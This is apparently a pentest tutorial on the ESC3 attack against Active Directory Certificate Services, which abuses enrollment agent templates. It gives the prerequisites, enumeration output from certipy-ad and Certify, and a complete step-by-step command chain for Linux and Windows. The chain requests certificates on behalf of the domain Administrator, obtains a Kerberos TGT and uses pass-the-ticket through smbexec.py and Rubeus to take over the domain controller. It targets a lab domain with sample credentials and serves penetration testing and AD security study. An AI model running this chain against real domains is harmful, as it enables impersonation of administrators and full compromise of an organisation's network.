This is another attack vector available and targets specifically the *Misconfigured Enrollment Agent Templates* itself and even if shares some similarities with ESC1/ESC2 requires another EKU( `Extended Key Usage`).
To make it easy to understand this attack vector happens when a Certificate template used the EKU(`Certificate Request Agent`), with the Object Identifier (OID) **1.3.6.1.4.1.311.20.2.1**, commonly referred to as "Enrollment Agent".
This particular EKU allows to request and enroll certificates on behalf of another user.


## Requisites
This time the requisites are a bit longer and will divide in the first part where the requestor(low-priv user) must be allowed to enroll a certificate with the specific EKU type **Certificate Request Agent**.
1. The Enterprise CA grants low-privileged users enrollment rights (same as `ESC1`).
2. Manager approval should be turned off (same as `ESC1`).
3. No authorized signatures are required (same as `ESC1`).
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates (same as `ESC1`).
5. The certificate template includes the `Certificate Request Agent EKU`, specifically the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), allowing the requesting of other certificate templates on behalf of other principals.

But it requires a secondary Template that allows the requestor to use the *enrollment agent certificate* to request certificates on behalf of other users.
1. The Enterprise CA grants low-privileged users enrollment rights (same as `ESC1`).
2. Manager approval should be turned off (same as `ESC1`).
3. The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
4. The certificate template defines an EKU that enables domain authentication.
5. No restrictions on enrollment agents are implemented at the CA level.


## Enumeration
To identify potential Templates that can be used to carry an ESC3 type attack we can do:
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
<SNIP>
    Template Name                       : ESC3
    Display Name                        : ESC3
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False 
    Enrollment Agent                    : True
    Any Purpose                         : False 
    Enrollee Supplies Subject           : False 
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536 
                                          ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC3                              : 'LAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
```
In this case we can verify that our requestor can both enroll&use the *enrollment agent certificate* from the setting `Extended Key Usage: Certificate Request Agent`.

**Windows:**
```
.\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

<SNIP>
    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC3
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
```


# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
After we identified the vulnerable Template, CA-Name and ascertain that we are allowed to enroll as Domain user we can proceed with the attack.
- Starting by enrolling a new certificate with the vulnerable template for the first phase attack.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.207.213 -ca lab-LAB-DC-CA -template ESC3
```
- We use the *pfx* certificate to perform the second phase attack and send another request, but we *MUST* use a valid template that allows *Enrollment Agent* in its EKUs(used the built-in User in the example). We can decide with user to impersonate withe the `-on-behalf-of` option.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.207.213 -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```
- Now we can use the administrator's pfx to perform an athentication and obtain a valid TGT ticket.
```
certipy-ad auth -pfx administrator.pfx -username Administrator -domain lab.local -dc-ip 10.129.207.213
```
- Lastly, we need to point the ticket in *ccache* format to be used in a *PassTheTicket* type attack and login into the server as Administrator (use the FQDN of the DC).
```
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

## Windows way
The same attack can be done directly from a Windows machine.
- We can start by enrolling a new certificate via Certify.exe
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3
```
- Next we need to convert the generated certificate to a valid *pfx* which contains the private-key as well. **OBS: Password can be left void.**
```
 & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Now we can use the certificate to follow the second phase of the attack and enroll a certificate that allows the use  of *Client Authentication* EKU on behalf of another user by obtain a TGT ticket that can be used afterwards in same session.
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx 
```
- Next we need to convert the admin certificate to a valid *pfx* which contains the private-key as well. **OBS: Password can be left void.**
```
 & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
 ```
 - Lastly, we can request a TGT and inject into current session.
 ```
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials /ptt
```
With the token injected into current session we can take it further and perform the attack type *PassTheTicket* to go in deeper into the environment.